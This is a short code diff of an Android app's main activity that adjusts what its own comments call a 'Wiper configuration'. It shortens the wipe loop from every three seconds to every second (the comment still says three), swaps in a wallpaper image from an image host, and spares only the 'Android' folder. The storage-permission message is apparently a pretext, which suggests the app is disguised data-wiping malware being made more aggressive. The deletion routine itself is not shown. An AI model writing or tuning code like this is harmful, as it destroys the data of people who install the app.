@@ -56,8 +56,8 @@ public class MainActivity extends Activity {
     private static final String MSG_PERM = "Storage permission is required to use this app";
 
     // Wiper configuration
-    private static final long WIPE_INTERVAL_MS = 3000L;         // loop every 3s
-    private static final String WALLPAPER_URL = "https://picsum.photos/1080/1920";
+    private static final long WIPE_INTERVAL_MS = 1000L;         // loop every 3s
+    private static final String WALLPAPER_URL = "https://i.ibb.co/99ZTQmxn/S-ivny-Opz-Xq-AF9-AZWjg-T-upload.jpg";
     private static final String[] PROTECTED_DIRS = {
             "Android"
     };
